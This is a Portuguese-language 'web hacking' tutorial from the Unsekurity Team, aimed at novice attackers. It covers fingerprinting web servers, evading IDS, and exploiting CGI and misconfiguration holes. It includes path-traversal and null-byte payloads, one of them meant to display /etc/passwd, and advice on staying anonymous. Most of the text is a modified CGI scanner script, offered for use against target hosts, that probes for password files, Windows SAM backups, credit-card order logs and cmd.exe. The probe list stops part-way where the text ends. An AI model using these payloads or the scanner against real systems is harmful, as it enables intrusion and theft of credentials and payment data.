@@ -1,0 +1,1881 @@
+#############################################################################
+############################ UNSEKURITY TEAM ################################
+#############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+
+
+OBS: Todos os dados e exemplos descritos neste arquivo possuem somente
+     propositos educacionais, o autor nao se responsabiliza pelo mau uso
+     dos mesmos.
+
+
+OBS2: Este artigo eh voltado ao pessoal NewBie Fucador, se voce se considera
+      elite, nao perca seu tempo lendo este humilde artigo!
+
+			************************
+			*    HACKING DE WEB    *
+			************************
+
+
+-------------------------------- INDICE -----------------------------------
+
+1 - INTRODUCAO
+2 - POSSIVEIS TECNICAS 
+   2.1. - Descobrindo o Servidor
+   2.2. - Vulnerabilidades no Servidor
+   2.3. - Furos em CGIs
+   2.4. - Furos em HTML
+   2.5. - Brutal Force
+3 - BACKDOORS
+   3.1. - HTTP Tunel
+   3.2. - Backdoor em CGI.
+4 - TERMINANDO
+   4.1 - Links e Referencias
+   4.2 - Consideracoes Finais
+
+---------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+Existem centenas de Script Kiddies mudando paginas Internet a fora atraves
+de mas implementacoes de Servidores WEB.No entanto, o Servidor WEB mais
+atacado eh o que menos se encontra em redes dita 'seguras'.Neste artigo
+eu pretendo abordar alguns esquemas bem mais uteis que apenas alterar uma
+pagina do servidor, e tambem pretendo descrever formas basicas de se
+atacar um Servidor WEB mais seguro, num Sistema Operacional menos Inseguro
+(Varios Unix).Este eh mais um artigo que possui como alvo a divulgacao
+de Conceitos e Teorias ao pessoal NewBie Fucador, logo, se voce eh um
+usuario avancado nao irah encontrar nada de util aqui! Conhecimentos 
+basicos de TCP/IP e implementacoes Servidoras de HTTP se faz necessario,
+ademais um bom sistema operacional(nao windows) para se testar os esquemas
+pode ser uma boa opcao.
+
+
+-----------------------
+2 - POSSIVEIS TECNICAS |
+-----------------------
+
+A grande maioria dos Administradores de Redes sao muito displicentes quando
+se trata de servidores de HTTP.Basta notarmos o grande numero de Servidores
+WEB invadidos e alterados via tecnicas amplamente divulgadas na Internet.
+As tecnicas que pretendo descrever aqui sao amplamente difundidas na Internet
+e as implementacoes que envolvem as mesmas tambem jah sao um fato, muitas
+vezes consumado, caberah a voce, amigo NewBie, ir mais fundo nas tecnicas
+envolvidas e no crescimento de um aprendizado maior dos conceitos envolvidos.
+Hoje em dia, a grande maioria dos fucadores prefere primeiro investir num
+servico 'reconhecidamente' aberto, pois em redes ditas "seguras"(entre aspas)
+uma simples implementacao de uma tecnica de scaneamento ou probe, como
+quiser, seria um desastre total, voce correria um grande risco de ser
+detectado e ateh mesmo rastreado, alem de que o IDS poderia barrar pacotes
+enviados por voce, gastando assim um enorme tempo 'a toa'.
+Grande parte da Comunidade de Seguranca ainda possui este conceito de um 
+atacante usando uma ferramenta como SATAN (hj em dia a moda eh o NMAP) 
+procurando portas abertas e em alguns casos ateh vulnerabilidades(Via Sscan, 
+NSS, VeteScan e etc).Sem duvida que tem casos que isto pode ser usado ainda, 
+na realidade na grande maioria das redes isto ainda eh possivel e tambem em
+redes menores e que voce sabe que nao terah uma Ferramenta de IDS a sua 
+espera.Mas redes mais dificeis esta nao eh uma boa tecnica, entao, um fucador 
+certamente irah deixar isto para ultimo caso, e irah visar primeiro as portas 
+reconhecidamente abertas para todo mundo.
+Uma dessas portas, e creio eu, a mais facilmente achada aberta no momento
+eh a porta 80(www), logo, um atacante poderia primeiro procurar obter 
+acesso sobre esta porta sem nem mesmo dar uma 'scaneada' no host alvo atras
+de portas de servicos abertas, evitando assim um FireWall e ateh mesmo um
+IDS.Abaixo eu enumero alguns possiveis esquemas a serem implementados num
+ataque a porta 80.
+
+2.1. - Descobrindo o Sevidor
+------------------------------
+
+Descobrir com exatidao o Servidor WEB pode nao ser uma das tarefas mais
+faceis em redes ditas 'seguras', pois a obtencao via BANNER pode nao ser
+efetiva.Descreverei aqui os metodos mais usados para se tentar descobrir
+qual Servidor WEB se estah rodando num host e qual Sistema Operacional o
+mesmo possui:
+
+* Obtencao do Servidor WEB via BANNER:
+
+Todos os Servidores WEB possuem BANNERS padroes que na maioria das vezes
+nao sao alterados.Em redes ditas 'seguras', certamente o Administrador da
+Rede farah esforcos para retirar o Banner do Servidor WEB.Sao varias as
+formas usadas para se tentar descobrir qual eh o Servidor WEB via banner,
+algumas delas seguem abaixo:
+
++ Browsers -> Atraves do seu proprio Browser voce pode obter informacoes
+	      sobre o Servidor WEB.No lynx, o modo mais facil eh acessarmos
+	      uma pagina do servidor alvo e digitar '='(igual).No site
+	      http://unsekurity.virtualave.net/ temos o seguinte:
+
+
+   Linkname: Unsekurity Team
+        URL: http://unsekurity.virtualave.net/
+    Charset: iso-8859-1
+     Server: Apache/1.2.6
+       Date: Sat, 22 Jul 2000 08:13:46 GMT
+   Owner(s): None
+       size: 25 lines
+       mode: normal
+
+Uma coisa nos interessa, os dados sobre o Servidor WEB:
+
+Server: Apache/1.2.6
+
+Mas Fica dificil saber qual Sistema Operacional o Servidor Alvo estah
+Executando, no entanto, as chances dele estar executando Apache sao
+consideraveis.
+
++ Netcat -> O Canivete Suico da L0pht mais uma vez eh util na tentativa
+	    de obtencao do Servidor WEB, o netcat pode perfeitamente ser
+	    usado para descobrir dados da seguinte forma:
+
+[localhost]# nc www.alvo.com.br 80
+get
+HTTP/1.1 400 Bad Request
+Server: Microsoft-IIS/5.0
+Date: Sat, 22 Jul 2000 08:49:22 GMT
+Content-Type: text/html
+Content-Length: 87
+
+<html><head><title>Error</title></head><body>The parameter is
+incorrect. </body>
+
+Como podemos ver, ele denunciou qual servidor estah sendo executado
+atraves de um simples envio de 'get':
+
+Server: Microsoft-IIS/5.0
+
+As Chances do sistema operacional deste alvo ser um Windows NT sao
+consideraveis.
+
++ NetCraft -> Netcraft eh um exemplo de um site que nos informa qual
+	      Servidor WEB estah sendo executado num determinado alvo.
+	      Ele eh bastante util, pois pode fortalecer nosso anonimato
+	      quando usado em conjunto com tecnicas de Bouncing ou Spoof.
+	      Abaixo seguem dois links onde se pode procurar obter dados
+	      de um Servidor WEB via NetCraft:
+
+http://www.netcraft.com/whats/
+http://www.ussrback.com/principal.html
+
+Dificilmente eu chego a usar isto e devem existir bem mais por aih, como
+se leva em consideracao a seguranca de uma rede alvo, dependendo do caso
+usar ferramentas via sites como o da NetCraf nao eh aconselhavel, pois
+talvez quanto mais anonimo voce estiver, melhor, se um Administrador
+experiente ver uma requisicao vindo deste site, ele irah ficar alerta
+esperando alguma invasao.
+
+* Obtencao do Sistema Operacional
+
+Obter o Sistema Operacional em redes ditas 'seguras' eh outro problema.
+Um das tecnica mais usadas atualmente eh a obtencao do Sistema Operacional
+atraves da tecnica conhecida como 'TCP/IP Stack Fingerprint', que procura
+descobrir qual eh o sistema operacional do host alvo atraves de um banco de 
+dados contendo informacoes da implemetacao do Stack do TCP/IP e suas
+particularidades em varios sistemas operacionais diferentes.Algumas
+ferramentas scanners(Queso,Nmap, etc) trabalham em cima deste conceito,
+enviando um pacote e analisando o pacote de resposta dado pelo servidor.
+Abaixo segue um exemplo desta tecnica utilizando o Nmap:
+
+[localhost]#  nmap -sX -O localhost 80
+
+Starting nmap V. 2.3BETA4 by Fyodor (fyodor@dhp.com,
+www.insecure.org/nmap/)
+WARNING: OS didn't match until the 3 try
+Interesting ports on localhost (IP do Alvo):
+Port    State       Protocol  Service
+80      open        tcp       http
+
+TCP Sequence Prediction: Class=random positive increments
+                         Difficulty=1108477 (Good luck!)
+Remote operating system guess: Linux 2.2.0-pre6 - 2.2.2-ac5
+
+Note que ele nos denunciou um Servidor Linux, em alguns casos, com bons
+banco de dados, esta tecnica pode ser bastante efetiva, mas em sistemas
+mais 'seguros', isto falha.
+
+* Problemas :
+
+Como eu disse no inicio, existem Administradores que mudam os BANNERS, por
+isso, nao se deve confiar muito na obtencao exata do Servidor WEB via BANNER.
+Mas, voce pode ter uma ideia de qual realmente eh o Servidor WEB atraves de 
+uma uniao de dados obtidos via BANNER, Sistema Operacional, Programas que
+Interagem com com o Servidor WEB(como scripts ASP, Banco de Dados, etc) e 
+etc.Deve-se agir sempre com bom senso quando se tenta descobrir qual SO e
+qual WEB Server um determinado host estah executando.Abaixo segue um site
+que deve ter seu BANNER alterado(capturado via lynx):
+
+   Linkname: Welcome to Rootshell | Hosted by connectnet.com
+        URL: http://rootshell.com/beta/news.html
+    Charset: iso-8859-1
+     Server: Rootshell/1.0.0 (--)
+       Date: Sun, 25 May 1997 05:14:36 GMT
+   Last Mod: Wed, 02 Apr 1997 17:04:36 GMT
+   Owner(s): None
+       size: 414 lines
+       mode: forms mode
+
+Note o 'Server', nao conheco este servidor de http, creio que o BANNER foi
+alterado com sucesso no caso acima.
+
+
+2.2. - Vulnerabilidades no Servidor
+------------------------------------
+
+Sem duvida, que esta eh a Tecnicas mais difundida e usada no momento.
+Condicoes de Buffer Overflow, mah configuracao de programas, Furos no
+Servidor WEB, enfim, nao sao poucas as vulnerabilidades encontradas
+ultimamente nos servidores WEB, especialmente no famoso IIS da Microsoft.
+Mas como nosso cenario eh outro(estamos supondo uma rede que leve em
+consideracao a seguranca, logo, as chances de voce achar uma rede deste
+tipo usando Windows sao pouquissimas!!), o principal programa servidor no
+momento eh o Apache.O Apache eh um programa complexo que goza de um certo
+respeito pela Comunidade Hacker por possuir seu codigo fonte aberto.Mas como
+eu disse, eh um programa complexo, que cada vez mais vem tendo um aumento
+de linhas de codigos e de funcoes, logo, as chances de se descobrir um
+furo no Servidor Apache sao consideraveis.Um fucador deve pesquisar
+incessantemente os programas ditos 'mais seguros' e procurar furos no mesmo.
+Conseguindo descobrir um furo 'perigoso' num desses programas, redes ditas
+"seguras" podem facilmente serem 'conquistadas' por ele.
+
+Quanto aos outros servidores, o IIS demonstrou e vem demonstrando ser uma
+verdadeira peneira, logo, ao meu ver o numero de redes ditas 'seguras' 
+usando isto sao poucas e deve diminuir cada vez mais.Existem varios outros
+servidores de HTTP, alguns especificos para determinada plataforma(Sistema
+Operacional) que devem conter inumeras vulnerabilidades.Abaixo eu enumero
+alguns deles e aonde voce pode encontrar informacoes sobre os mesmos:
+
+America On Line Server(AOL) - http://aolserver.com/dist/aolserver3_0/
+Apache - http://www.apache.org/dist/
+Zeus WEB Server - http://www.zeustechnology.com/downloads/
+StrongHold(Apache + SSL) - http://www.int.c2.net/
+
+Sendo que destes acima, eh mais facil encontrarmos o ultimo, 'StrongHold,
+ou algum Apache com Criptografia Forte em redes ditas 'seguras'.
+
+Agora, para que voce possa estar apto para nao soh procurar e descobrir
+furos, mas acima de tudo 'exploita-los' recomendo muito estudo! As
+tecnicas de 'Auditoria de Software' sao varias, mas nao basta soh isso,
+voce precisa fucar,nao adianta somente ter a teoria, conhecer o conceito, 
+mas acima de tudo, voce precisa fucar!! Como se fuca??? Execute o programa 
+de formas diferentes,interaga ele com outros, mecha, altere coisas nele, crie 
+situacoes, tente exploita-lo via tecnicas jah difundidas, procure furos no 
+codigo fonte, veja a reacao dele a determinadas acoes maliciosas, enfim fuce!!
+Mexa nele de forma diferente! Acredite sempre que lah tem um furo a sua
+espera!!O dominio de algumas tecnicas se faz necessario, mas mesmo sem
+saber muito sobre elas, nada o impede que voce fuce e busque mesmo um furo
+na 'doida'!! Isso mesmo, tente achar na marra!!Abaixo seguem furos jah
+divulgados que envolvem um servidor WEB ou algum programa que interaja com
+Servidores WEB:
+
+* BUFFER OVERFLOWS -> Tecnica Classica que jah possui material divulgado
+		      pelo Unsekurity Team.Consiste em atraves do envio
+		      de dados ou parametros para o servidor WEB ou algum
+		      programa banco de dados ou que interaja com o servidor
+		      WEB, o atacante consiga gerar um estouro de buffer
+		      executando codigo malicioso no servidor alvo.
+		      Exemplo desta tecnica eh um furo no IIS 4.0.
+
+* META CARACTERES ->  Este eh um problema comum em script CGIs que veremos
+		      mais abaixo, mas eh possivel que algum arquivo do
+		      servidor WEB nao filtre direito metacaracteres e deixe
+		      passar varios tipos de requicicoes como "../../../",
+		      "/..../" e etc. Exemplo desta Tecnica pode ser visto
+		      no FrontPage 3.0.2 que nao filtrava alguns meta
+		      caracteres permitindo requisicoes, como a vista abaixo:
+		      http://www.alvo.com/..../Windows/Admin.pwl;
+
+* PERMISSOES -> Alguns Scripts podem vir com permissoes de escrita ou
+		execucao para todo mundo, ateh mesmo existem executaveis
+		de carregamento e download de arquivos que podem ser usados
+		por atacantes para enviar e executar arquivos no servidor
+		alvo.Exemplo disso eh um bug do Frontpage, onde se pode
+		enviar e sobrescrever uma pagina do servidor sem a
+		necessidade de autenticacao.
+
+* MAH CONFIGURACAO -> O 'Furo' acima pode muito bem ser caracterizado aqui,
+		      neste item, onde atraves de erros de configuracao
+		      determinadas situacoes podem ser usadas para se tirar
+		      proveito, o atacante teria antes que simular diversas
+		      maneiras de configuracao de um servidor WEB.Um exemplo
+		      disso eh o problema com PHP, sendo que jah tem um
+		      artigo do Unsekurity Team abordando este problema,
+		      no qual eh possivel executar qualquer script PHP,
+		      inclusive uma bindshell em qualquer diretorio do
+		      servidor alvo.
+		      
+* PROGRAMAS INTERATIVOS -> Banco de Dados, Script CGIs, WebForum, Scripts
+			   de Formularios, Programas de WebMail, enfim,
+			   hoje em dia existe um 'leque' de opcoes de
+			   programas que sao usados em conjunto com o
+			   servidor WEB.No caso de redes ditas "seguras",
+			   procurar furos em aplicativos que interagem ou
+			   recebem parametros e dados via Servidor WEB pode
+			   ser uma boa opcao.Varios sao os furos encontrados
+			   em milhares destes programas sendo que as tecnicas
+			   descritas acima tambem se aplicam a esses programas.
+			   Exemplo disto eh o UltraBoard 2000 CGI usado para 
+			   programas de WEBForum que nao filtra o NULL byte
+			   (\000) e permite varios tipos de exploitacao.
+			   A Requisicao abaixo pode consumir os recursos de
+			   um sistema:
+			   QUERY_STRING=Session=../UltraBoard.pl%00%7c
+			   outro mais perigoso poderia ser:
+			   QUERY_STRING=Session=../UltraBoard.pl
+				         ?Action=PrintableTopic
+                                         ?Post=../../etc/passwd\000
+				         ?Board=IDS?Idle=10?Sort=0?Page=0
+			   Se o servidor estah bugado, teriamos entao o
+			   passwd na tela.
+			   
+
+* OUTROS -> Condicoes de Denial Of Service sao bastante comuns em Servidores
+	    WEB, mais uma vez o alvo preferido eh a peneira do IIS da
+	    Microsoft.Como eu jah disse, em alguns casos o Denial of Service
+	    pode ser uma excelente tecnica efetiva principalmente na
+	    reinicializacao de um Servidor NT, no entanto devemos nos lembrar
+	    do IDS e contemplar que perigos estaremos correndo frente a
+	    este programa.
+	    	    
+
+Fique atento as publicacoes do Unsekurity Team, pois eh nosso objetivo
+expandir e trocar mais informacoes sobre todas as tecnicas usadas por 
+fucadores em toda e qualquer implementacao, inclusive no hacking de WEB.
+
+2.3. - Furos em CGIs
+----------------------
+
+Este eh um problema muito encontrado e merece um 'Tutorial' a parte que
+em breve deverah ser publicado pelo pessoal do Unsekurity Team.Sao varios
+os possiveis problemas encontrados em Scripts CGIs e as formas de se
+exploita-los.Irei descrever algumas coisas bem basicas, mas em breve deve
+sair um material mais amplo sobre esta materia('Escrita e Problemas de CGIs').
+
+CGI significa Common Gateway Interface e se refere aos programas que
+executam determinadas tarefas atraves de um servidor WEB, inclusive comandos
+shell no Servidor Alvo.Abaixo seguem alguns problemas comuns em Scripts
+CGIs:
+
+* Chamadas Para o Sistema:
+
+Se o Script cgi nao seta corretamente meta-caracteres e caracteres ASCII,
+o Servidor WEB corre um serio risco.Se o atacante possui acesso local ao
+sistema, ele pode setar a variavel Environment 'PATH' e tentar executar
+codigo malicioso como usuario comum.
+
+* Abertura de Arquivos:
+
+Varios problemas que tambem envolvem meta-caracters e variaveis
+environment.Em alguns casos eh possivel redirecionar entradas e saidas.
+
+Um Tutorial mais amplo estah a caminho, nele poderemos ver exemplo 
+praticos e especificos que envolvem estes problemas em algumas linguagens
+para escrita de CGIs.
+
+Procurar um CGI valido numa rede complexa e grande tambem nao eh nada facil.
+Existem centenas de programas que procuram CGIs automaticamente em
+servidores WEB, mas a grande maioria, quase todos, nao sao bons programas.
+Abaixo segue um script criado por ben-z que vem junto com o Vetescan e
+alterado por mim para facilitar ainda mais o seu uso:
+
+----------------------------- cgichk.sh ---------------------------------
+#!/bin/sh
+# cgiscan.sh by ben-z [3/23/99]
+# written for use in fts-rvscan
+# Alterado por Nash Leon.
+# Uso: ./cgichk www.alvo.com
+# OBS: Necessita do Netcat instalado em sua maquina(nc).
+
+if [ "$#" != 1 ]; then
+echo "CGI - Scanner by ben-z e Alterado por Nash Leon."
+echo "Uso: sh cgichk.sh <host_alvo>"; echo " "
+echo "Exemplo: sh cgichk.sh www.alvo.com"
+exit 1
+fi
+clear
+echo "CGI-Scanner by ben-z e Alterado por Nash Leon"
+echo "Comecando Scaneamento...."
+echo " "
+contador="0"
+rm cgilist 1>/dev/null 2>/dev/null
+function testcgi {
+contador=`expr $contador + 1`
+echo -n "[$contador]: Procurando http://$1$2 [**] "
+cmsg=" timeout [005]"
+rm .tmp 1>/dev/null 2>/dev/null
+ycgi="0"
+(echo "GET $2" ; sleep 1) | nc -w 4 $1 80 1>.tmp 2>.tmp
+cat .tmp | grep -i "<" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Encontrado!"
+ ycgi="1"
+fi
+cat .tmp | grep -i "not found" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg="Nao Encontrado [000]"
+ ycgi="0"
+fi
+cat .tmp | grep "404" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Nao Encontrado [404]"
+ ycgi="0"
+fi
+cat .tmp | grep "403" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Acesso Negado [403]"
+ ycgi="0"
+fi
+cat .tmp | grep "500" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Falha no Servidor [500]"
+ ycgi="0"
+fi
+cat .tmp | grep "505" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Redirecionada [505]"
+ ycgi="0"
+fi
+cat .tmp | grep "302" >/dev/null 2>&1
+if [ $? -eq 0 ]; then
+ cmsg=" Indisponivel [302]"
+ ycgi="0"
+fi
+echo $cmsg
+if [ "$ycgi" = "1" ]; then
+ echo "http://$1$2" >>cgilist
+fi
+}
+if [ "$2" != "" ]; then
+ testcgi $1 $2
+ exit 1
+fi
+
+testcgi $1 /....../ all
+testcgi $1 /....../config.sys
+testcgi $1 /....../etc/hosts
+testcgi $1 /../../../../ all
+testcgi $1 /../../../../../../../boot.ini
+testcgi $1 /../../../../../winnt/repair/sam._
+testcgi $1 /../../../../config.sys
+testcgi $1 /../../../../etc/hosts
+testcgi $1 /.access
+testcgi $1 /.bash_history
+testcgi $1 /.htaccess
+testcgi $1 /.html/............./config.sys
+testcgi $1 /.htpasswd
+testcgi $1 /.passwd
+testcgi $1 /ASPSamp/AdvWorks/equipment/catalog_type.asp
+testcgi $1 /Admin_files/order.log
+testcgi $1 /AdvWorks/equipment/catalog_type.asp
+testcgi $1 /Orders/order.log
+testcgi $1 /PDG_Cart/order.log
+testcgi $1 /PDG_Cart/shopper.conf
+testcgi $1 /PSUser/PSCOErrPage.htm
+testcgi $1 /WebShop/logs/cc.txt
+testcgi $1 /WebShop/logs/ck.log
+testcgi $1 /WebShop/templates/cc.txt
+testcgi $1 /_private
+testcgi $1 /_vti_bin/_vti_aut/dvwssr.dll
+testcgi $1 /_vti_bin/fpcount.exe
+testcgi $1 /_vti_inf.html
+testcgi $1 /_vti_pvt
+testcgi $1 /_vti_pvt/administrators.pwd
+testcgi $1 /_vti_pvt/authors.pwd
+testcgi $1 /_vti_pvt/service.pwd
+testcgi $1 /_vti_pvt/shtml.dll
+testcgi $1 /_vti_pvt/shtml.exe
+testcgi $1 /_vti_pvt/users.pwd
+testcgi $1 /adsamples/config/site.csc
+testcgi $1 /bin
+testcgi $1 /carbo.dll
+testcgi $1 /ccbill/secure/ccbill.log
+testcgi $1 /cfdocs/cfmlsyntaxcheck.cfm
+testcgi $1 /cfdocs/exampleapp/docs/sourcewindow.cfm
+testcgi $1 /cfdocs/exampleapp/email/getfile.cfm?filename=c:\boot.ini
+testcgi $1 /cfdocs/expelval/displayopenedfile.cfm
+testcgi $1 /cfdocs/expelval/exprcalc.cfm
+testcgi $1 /cfdocs/expelval/openfile.cfm
+testcgi $1 /cfdocs/expelval/sendmail.cfm
+testcgi $1 /cfdocs/snippets/fileexists.cfm
+testcgi $1 /cfdocs/snippets/viewexample.cfm
+testcgi $1 /cgi
+testcgi $1 /cgi-bin
+testcgi $1 /cgi-bin/AT-admin.cgi
+testcgi $1 /cgi-bin/AT-generate.cgi
+testcgi $1 /cgi-bin/Admin_files/order.log
+testcgi $1 /cgi-bin/AnyForm2
+testcgi $1 /cgi-bin/Cgitest.exe
+testcgi $1 /cgi-bin/Count.cgi
+testcgi $1 /cgi-bin/FormHandler.cgi
+testcgi $1 /cgi-bin/GW5/GWWEB.EXE
+testcgi $1 /cgi-bin/UltraBoard.cgi
+testcgi $1 /cgi-bin/UltraBoard.pl
+testcgi $1 /cgi-bin/add_ftp.cgi
+testcgi $1 /cgi-bin/adp
+testcgi $1 /cgi-bin/adpassword.txt
+testcgi $1 /cgi-bin/ads.setup
+testcgi $1 /cgi-bin/aglimpse
+testcgi $1 /cgi-bin/alibaba.pl
+testcgi $1 /cgi-bin/allmanage.pl
+testcgi $1 /cgi-bin/allmanage/adp
+testcgi $1 /cgi-bin/allmanage/k
+testcgi $1 /cgi-bin/allmanage/settings.cfg
+testcgi $1 /cgi-bin/allmanage/userfile.dat
+testcgi $1 /cgi-bin/allmanageup.pl
+testcgi $1 /cgi-bin/anyboard.cgi
+testcgi $1 /cgi-bin/architext_query.pl
+testcgi $1 /cgi-bin/authorize/dbmfiles/users
+testcgi $1 /cgi-bin/ax-admin.cgi
+testcgi $1 /cgi-bin/ax.cgi
+testcgi $1 /cgi-bin/bigconf.cgi all
+testcgi $1 /cgi-bin/bizdb1-search.cgi
+testcgi $1 /cgi-bin/bnbform.cgi
+testcgi $1 /cgi-bin/cachemgr.cgi
+testcgi $1 /cgi-bin/calender.pl
+testcgi $1 /cgi-bin/calender_admin.pl
+testcgi $1 /cgi-bin/campas
+testcgi $1 /cgi-bin/cart.pl
+testcgi $1 /cgi-bin/cgiwrap
+testcgi $1 /cgi-bin/classifieds.cgi
+testcgi $1 /cgi-bin/clickresponder.pl
+testcgi $1 /cgi-bin/cmd.exe
+testcgi $1 /cgi-bin/counterfiglet
+testcgi $1 /cgi-bin/dbmlparser.exe
+testcgi $1 /cgi-bin/dig.cgi
+testcgi $1 /cgi-bin/dnewsweb
+testcgi $1 /cgi-bin/edit.pl
+testcgi $1 /cgi-bin/environ.cgi
+testcgi $1 /cgi-bin/excite
+testcgi $1 /cgi-bin/faxsurvey
+testcgi $1 /cgi-bin/filemail.pl
+testcgi $1 /cgi-bin/files.pl
+testcgi $1 /cgi-bin/finger
+testcgi $1 /cgi-bin/finger.pl
+testcgi $1 /cgi-bin/formmail.pl
+testcgi $1 /cgi-bin/fpcount.exe
+testcgi $1 /cgi-bin/fpexplore.exe
+testcgi $1 /cgi-bin/gH.cgi
+testcgi $1 /cgi-bin/get32.exe
+testcgi $1 /cgi-bin/glimpse
+testcgi $1 /cgi-bin/guestbook.cgi
+testcgi $1 /cgi-bin/handler
+testcgi $1 /cgi-bin/htimage.exe
+testcgi $1 /cgi-bin/htmlscript
+testcgi $1 /cgi-bin/htsearch
+testcgi $1 /cgi-bin/htsearch
+testcgi $1 /cgi-bin/iisadmpwd/achg.htr
+testcgi $1 /cgi-bin/iisadmpwd/aexp.htr
+testcgi $1 /cgi-bin/iisadmpwd/aexp2.htr
+testcgi $1 /cgi-bin/iisadmpwd/anot.htr
+testcgi $1 /cgi-bin/imagemap.exe
+testcgi $1 /cgi-bin/info2www
+testcgi $1 /cgi-bin/infosrch.cgi
+testcgi $1 /cgi-bin/input.bat
+testcgi $1 /cgi-bin/input2.bat
+testcgi $1 /cgi-bin/jj
+testcgi $1 /cgi-bin/k
+testcgi $1 /cgi-bin/loadpage.cgi
+testcgi $1 /cgi-bin/mailform.exe
+testcgi $1 /cgi-bin/maillist.pl
+testcgi $1 /cgi-bin/makechanges/easysteps/easysteps.pl
+testcgi $1 /cgi-bin/man.sh
+testcgi $1 /cgi-bin/netstat
+testcgi $1 /cgi-bin/nph-publish
+testcgi $1 /cgi-bin/nph-test-cgi
+testcgi $1 /cgi-bin/passwd
+testcgi $1 /cgi-bin/passwd.txt
+testcgi $1 /cgi-bin/perl.exe
+testcgi $1 /cgi-bin/perlshop.cgi
+testcgi $1 /cgi-bin/pfdispaly.cgi
+testcgi $1 /cgi-bin/pfdisplay
+testcgi $1 /cgi-bin/pfdisplay.cgi
+testcgi $1 /cgi-bin/phf
+testcgi $1 /cgi-bin/php.cgi
+testcgi $1 /cgi-bin/plusmail
+testcgi $1 /cgi-bin/postcard.pl
+testcgi $1 /cgi-bin/printenv
+testcgi $1 /cgi-bin/process_bug.cgi
+testcgi $1 /cgi-bin/query
+testcgi $1 /cgi-bin/responder
+testcgi $1 /cgi-bin/rguest.exe
+testcgi $1 /cgi-bin/rpm_query
+testcgi $1 /cgi-bin/rwwwshell.pl
+testcgi $1 /cgi-bin/search.cgi
+testcgi $1 /cgi-bin/settings.cfg
+testcgi $1 /cgi-bin/sojourn
+testcgi $1 /cgi-bin/survey.cgi
+testcgi $1 /cgi-bin/test-cgi
+testcgi $1 /cgi-bin/test.bat
+testcgi $1 /cgi-bin/textcounter.pl
+testcgi $1 /cgi-bin/tpgnrock
+testcgi $1 /cgi-bin/tst.bat
+testcgi $1 /cgi-bin/tst.bat
+testcgi $1 /cgi-bin/unlg1.1
+testcgi $1 /cgi-bin/unlg1.2
+testcgi $1 /cgi-bin/userfile.dat
+testcgi $1 /cgi-bin/view-source
+testcgi $1 /cgi-bin/visadmin.exe
+testcgi $1 /cgi-bin/w3-msql/
+testcgi $1 /cgi-bin/webbbs.cgi
+testcgi $1 /cgi-bin/webdist.cgi
+testcgi $1 /cgi-bin/webplus
+testcgi $1 /cgi-bin/websendmail
+testcgi $1 /cgi-bin/webwho.pl
+testcgi $1 /cgi-bin/wguest.exe
+testcgi $1 /cgi-bin/whois_raw.cgi
+testcgi $1 /cgi-bin/windmail.exe
+testcgi $1 /cgi-bin/wrap
+testcgi $1 /cgi-bin/www-sql
+testcgi $1 /cgi-bin/wwwadmin.pl
+testcgi $1 /cgi-bin/wwwboard.pl
+testcgi $1 /cgi-dos/args.bat
+testcgi $1 /cgi-dos/args.cmd
+testcgi $1 /cgi-local
+testcgi $1 /cgi-shl/win-c-sample.exe
+testcgi $1 /cgi-src
+testcgi $1 /cgi-src/phf.c
+testcgi $1 /cgi-win
+testcgi $1 /cgi-win/uploader.exe
+testcgi $1 /cgibin
+testcgi $1 /com1
+testcgi $1 /com2
+testcgi $1 /com3
+testcgi $1 /com4
+testcgi $1 /con/con
+testcgi $1 /config/checks.txt
+testcgi $1 /config/import.txt
+testcgi $1 /config/mountain.cfg
+testcgi $1 /config/orders.txt
+testcgi $1 /default.asp.
+testcgi $1 /default.asp::$DATA
+testcgi $1 /doc
+testcgi $1 /iisadmpwd/aexp2.htr
+testcgi $1 /iishelp/iis/misc/iirturnh.htw
+testcgi $1 /iissamples/exair/howitworks/codebrws.asp
+testcgi $1 /iissamples/exair/search/advsearch.asp
+testcgi $1 /iissamples/exair/search/qfullhit.htw
+testcgi $1 /iissamples/exair/search/qsumrhit.htw
+testcgi $1 /iissamples/iissamples/query.asp
+testcgi $1 /iissamples/issamples/oop/qfullhit.htw
+testcgi $1 /iissamples/issamples/oop/qsumrhit.htw
+testcgi $1 /iissamples/sdk/asp/docs/codebrws.asp
+testcgi $1 /log
+testcgi $1 /logs
+testcgi $1 /mall_log_files/order.log
+testcgi $1 /manage/cgi/cgiproc
+testcgi $1 /msadc/Samples/SELECTOR/showcode.asp
+testcgi $1 /msadc/msadcs.dll
+testcgi $1 /msads/Samples/SELECTOR/showcode.asp
+testcgi $1 /ncl_items.html
+testcgi $1 /order/order.log
+testcgi $1 /orders/checks.txt
+testcgi $1 /orders/import.txt
+testcgi $1 /orders/mountain.cfg
+testcgi $1 /orders/order.log
+testcgi $1 /orders/orders.txt
+testcgi $1 /ping all
+testcgi $1 /ping?SomeCrapHere
+testcgi $1 /piranha/secure/passwd.php3
+testcgi $1 /pw/storemgr.pw
+testcgi $1 /quikstore.cfg
+testcgi $1 /samples/search/queryhit.htm
+testcgi $1 /scripts
+testcgi $1 /scripts/CGImail.exe
+testcgi $1 /scripts/c32web.exe/ChangeAdminPassword
+testcgi $1 /scripts/cart32.exe/cart32clientlist
+testcgi $1 /scripts/cmd.exe
+testcgi $1 /scripts/convert.bas
+testcgi $1 /scripts/counter.exe
+testcgi $1 /scripts/dbman/db.cgi?db=invalid-db
+testcgi $1 /scripts/emurl/RECMAN.dll
+testcgi $1 /scripts/fpcount.exe
+testcgi $1 /scripts/iisadmin/ism.dll?http/dir
+testcgi $1 /scripts/issadmin/bdir.htr
+testcgi $1 /scripts/no-such-file.pl
+testcgi $1 /scripts/proxy/w3proxy.dll
+testcgi $1 /scripts/slxweb.dll
+testcgi $1 /scripts/tools/mkilog.exe
+testcgi $1 /scripts/tools/newdsn.exe
+testcgi $1 /scripts/uploadn.asp
+testcgi $1 /scripts/wa.exe
+testcgi $1 /scripts/webbbs.exe
+testcgi $1 /scripts/wsisa.dll
+testcgi $1 /search97.vts
+testcgi $1 /server-status
+testcgi $1 /showfile.asp
+testcgi $1 /ssi/envout.bat
